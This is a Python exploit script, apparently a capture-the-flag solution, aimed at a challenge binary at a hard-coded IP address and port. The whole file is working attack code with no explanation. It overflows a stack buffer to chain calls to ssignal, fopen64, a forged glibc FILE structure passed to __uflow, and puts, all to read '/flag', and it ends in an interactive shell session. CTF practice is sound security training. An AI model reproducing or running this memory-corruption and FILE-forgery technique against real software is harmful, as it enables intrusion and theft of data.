from ptrlib import *

binary = "./chal"
elf = ELF(binary)

"""
is_remote = False
r = Process(binary)
"""
r = Socket("nc 52.165.26.180 8810")
is_remote = True
# """


def call(f, arg1, arg2, remain_buf=None, g_buf=b"A"*254, wait=False, overflow=False):
    payload = b"A" * 24
    payload += p64(f)
    payload += p64(arg2)
    payload += p64(arg1)
    if overflow:
        payload += b"A" * (254 - len(payload))

    g_buf = g_buf.ljust(254, b"\x00")
    assert (is_fgets_safe(g_buf))
    assert (is_fgets_safe(payload))
    r.sendline(g_buf)
    r.sendline(payload)


ssignal = elf.symbol("ssignal")
main = elf.symbol("main")
segv = 11
fopen64 = elf.symbol("fopen64")
g_buf_addr = elf.symbol("g_buf")

call(ssignal, segv, main, overflow=True)

if is_remote:
    g_buf = b"/flag\x00"
else:
    g_buf = b"flag.txt\x00"
g_buf += b"\x00" * (32 - len(g_buf))
g_buf += b"r\x00"
call(fopen64, g_buf_addr, g_buf_addr + 32, g_buf=g_buf)

fake_file = [
    0x00000000fbad2488,
    g_buf_addr + 256,  # _IO_read_ptr
    g_buf_addr + 256,  # _IO_read_end
    g_buf_addr + 256,  # _IO_read_base
    g_buf_addr + 256,  # _IO_write_base
    g_buf_addr + 256,  # _IO_write_ptr
    g_buf_addr + 256,  # _IO_write_end
    g_buf_addr + 256,  # _IO_buf_base
    g_buf_addr + 512,  # _IO_buf_end
    0,  # _IO_buf_base
    0,  # _IO_buf_base
    0,  # _IO_buf_base
    0,  # _IO_buf_base
    0,  # _IO_buf_base
    3, 0,
    0, g_buf_addr + 256,
    0xffffffffffffffff, 0,
    g_buf_addr + 512, 0,
    0, 0,
    0, 0,
    0, 0x00000000004a7b50
]
fake_file = b''.join(map(p64, fake_file))
assert (len(fake_file) < 0x100)
call(elf.symbol("__uflow"), g_buf_addr, 0, g_buf=fake_file, wait=True)

call(elf.symbol("puts"), g_buf_addr + 256, 0)
call(elf.symbol("exit"), 0, 0)
flag = r.recvline()
print(flag)
r.sh()
